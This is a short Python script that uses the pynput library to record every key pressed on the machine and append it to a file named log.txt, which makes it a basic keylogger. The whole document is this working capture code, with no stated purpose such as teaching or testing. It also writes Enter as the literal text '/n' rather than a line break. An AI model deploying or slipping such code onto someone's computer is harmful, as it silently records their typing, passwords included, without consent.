from pynput.keyboard import Listener


def write_to_file(key):
    letter = str(key).strip("'")
    if letter == 'Key.space':
        letter = ' '
    elif letter == 'Key.enter':
        letter = '  /n '
    elif letter == 'Key.backspace':
        letter = ' b'
    with open('log.txt', 'a') as f:
        f.write(letter)


with Listener(on_press=write_to_file) as listener:
    listener.join()
